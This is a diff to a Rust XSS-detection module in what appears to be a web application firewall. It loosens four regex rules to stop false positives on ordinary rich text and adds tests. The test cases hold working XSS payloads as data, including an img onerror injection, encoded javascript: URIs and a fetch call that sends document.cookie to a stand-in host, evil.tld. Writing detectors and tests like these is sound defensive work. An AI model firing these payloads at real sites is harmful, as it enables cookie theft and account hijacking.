@@ -35,8 +35,19 @@ static XSS_SET: LazyLock<Option<RegexSet>> = LazyLock::new(|| {
         r"(?i)<\s*/?\s*script[\s/>]",
         // Event handlers: on[event]=
         r"(?i)\bon(abort|blur|change|click|dblclick|drag|drop|error|focus|hashchange|input|keydown|keypress|keyup|load|message|mousedown|mousemove|mouseout|mouseover|mouseup|paste|popstate|reset|resize|scroll|select|submit|touchend|touchmove|touchstart|unload|wheel)\s*=",
-        // javascript: (allow whitespace/encoding obfuscation)
-        r"(?i)j[\s]*a[\s]*v[\s]*a[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:",
+        // ── XSS-003 — javascript: URI ────────────────────────────────────────
+        // The letter-by-letter `[\s]*` spacing is kept (it is what defeats
+        // `j a v a s c r i p t:` obfuscation), but the bare colon match blocked
+        // any prose that names the language with a colon after it —
+        // "JavaScript: The Good Parts", "JavaScript: null vs undefined" — which
+        // is everyday CMS/blog/docs content. A URI is only dangerous if
+        // something executable follows the colon.
+        concat!(
+            r"(?i)j[\s]*a[\s]*v[\s]*a[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:[\s]{0,4}",
+            r"(?:[a-z_$][\w$.]{0,32}[\s]{0,4}[(\[]",
+            r"|//|/\*|void|alert|prompt|confirm|eval|document|window|location|top\b|self\b|this\b",
+            r"|fetch|import|new[\s]|&#|%[0-9a-f]{2}|\\u00)",
+        ),
         // vbscript:
         r"(?i)v[\s]*b[\s]*s[\s]*c[\s]*r[\s]*i[\s]*p[\s]*t[\s]*:",
         // CSS expression()
@@ -47,12 +58,25 @@ static XSS_SET: LazyLock<Option<RegexSet>> = LazyLock::new(|| {
         r"(?i)document\s*\.\s*(cookie|write|writeln|body|location|domain|referrer)",
         // eval(
         r"(?i)\beval\s*\(",
-        // .innerHTML =
-        r"(?i)\.innerHTML\s*=",
+        // ── XSS-009 — `.innerHTML =` ─────────────────────────────────────────
+        // A bare `.innerHTML =` is ordinary JavaScript and appears in every
+        // code-review / snippet-sharing payload (`el.innerHTML = escapeHtml(x)`).
+        // Only an assignment whose right-hand side actually starts markup is a
+        // sink being fed a payload.
+        r"(?i)\.innerHTML\s*=\s*[`'\x22]?\s*(?:<|&lt;|&#)",
         // fromCharCode
         r"(?i)\bfromCharCode\b",
-        // HTML numeric entities &#x41; or &#65;
-        r"&#\s*(x\s*[0-9a-fA-F]+|[0-9]+)\s*;",
+        // ── XSS-011 — HTML numeric character reference ───────────────────────
+        // `&#<any number>;` matched every typographic entity in ordinary rich
+        // text (`Caf&#233;`, `&#8217;`, `&#8212;`) — a 403 on any CMS/editor
+        // payload. Only two things make an entity an attack: it encodes a
+        // markup-critical character (`<`, `>`, `"`, `'`, backtick), or the
+        // input is a long unbroken entity run, which is the classic
+        // fully-encoded `javascript:` obfuscation.
+        concat!(
+            r"(?:&#\s*0*(?:x0*(?:3[ceCE]|2[27]|60)|60|62|34|39|96)\s*;",
+            r"|(?:&#\s*x?0*[0-9a-fA-F]{1,6}\s*;){8,})",
+        ),
         // <svg onload=...>
         r"(?i)<\s*svg[^>]*\bon\w+\s*=",
         // <img src=javascript:
@@ -61,8 +85,17 @@ static XSS_SET: LazyLock<Option<RegexSet>> = LazyLock::new(|| {
         r"(?i)<\s*iframe[\s/>]",
         // <object> / <embed>
         r"(?i)<\s*(object|embed)[\s/>]",
-        // Inline SVG/MathML vectors
-        r"(?i)<\s*(svg|math)[\s/>]",
+        // ── XSS-016 — inline SVG / MathML vector ─────────────────────────────
+        // A plain `<svg>` is inert markup — an icon in a rich-text field or an
+        // uploaded logo — and blocking it 403s ordinary content. The vector is
+        // always what the element *carries*: a nested script, an event handler
+        // (also covered by XSS-002/XSS-012), an `xlink:href`, or one of the SVG
+        // elements that can execute (`use`, `animate`, `set`, `foreignObject`,
+        // MathML `maction`).
+        concat!(
+            r"(?i)<\s*(?:svg|math)\b[\s\S]{0,300}?",
+            r"(?:<\s*script|\bon\w{2,20}\s*=|xlink:href|<\s*(?:use|animate|set|foreignobject|maction)\b)",
+        ),
     ]) {
         Ok(set) => Some(set),
         Err(e) => {
@@ -183,5 +216,47 @@ mod tests {
         let checker = XssCheck::new();
         let ctx = make_ctx("q=hello+world&page=1", "");
         assert!(checker.check(&ctx).is_none());
+    }
+
+    /// Rich text, icons and code snippets are ordinary business content.
+    #[test]
+    fn benign_rich_content_is_allowed() {
+        let checker = XssCheck::new();
+        for body in [
+            r#"{"html":"<p>Caf&#233; Rossi&#8217;s menu &#8212; open</p>"}"#,
+            r#"{"icon":"<svg viewBox=\"0 0 16 16\"><path d=\"M1 1\"/></svg>"}"#,
+            r#"{"snippet":"el.innerHTML = escapeHtml(value);"}"#,
+            r#"{"title":"JavaScript: The Good Parts"}"#,
+            r#"{"post":"JavaScript: null vs undefined explained"}"#,
+        ] {
+            let ctx = make_ctx("", body);
+            assert!(checker.check(&ctx).is_none(), "benign content must not fire: {body}");
+        }
+    }
+
+    /// The vectors behind those three narrowings must still fire.
+    #[test]
+    fn narrowed_rules_still_detect_payloads() {
+        let checker = XssCheck::new();
+        for body in [
+            // entity-encoded `<script>` (markup-critical codepoints)
+            r#"{"x":"&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"}"#,
+            // fully entity-encoded `javascript:` URI (long unbroken run)
+            r#"{"x":"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"}"#,
+            // svg carrying a script
+            r#"{"x":"<svg><script>alert(1)</script></svg>"}"#,
+            // svg carrying an executable child element
+            r#"{"x":"<svg><use href=\"data:image/svg+xml;base64,PHN2Zz4=\"/></svg>"}"#,
+            // innerHTML fed actual markup
+            r#"{"x":"box.innerHTML = '<img src=x onerror=alert(1)>'"}"#,
+            // javascript: URIs in their executable forms
+            r#"{"x":"javascript:alert(1)"}"#,
+            r#"{"x":"java script:void(0)"}"#,
+            r#"{"x":"javascript:document.cookie"}"#,
+            r#"{"x":"javascript:fetch('//evil.tld/'+document.cookie)"}"#,
+        ] {
+            let ctx = make_ctx("", body);
+            assert!(checker.check(&ctx).is_some(), "xss payload must still fire: {body}");
+        }
     }
 }
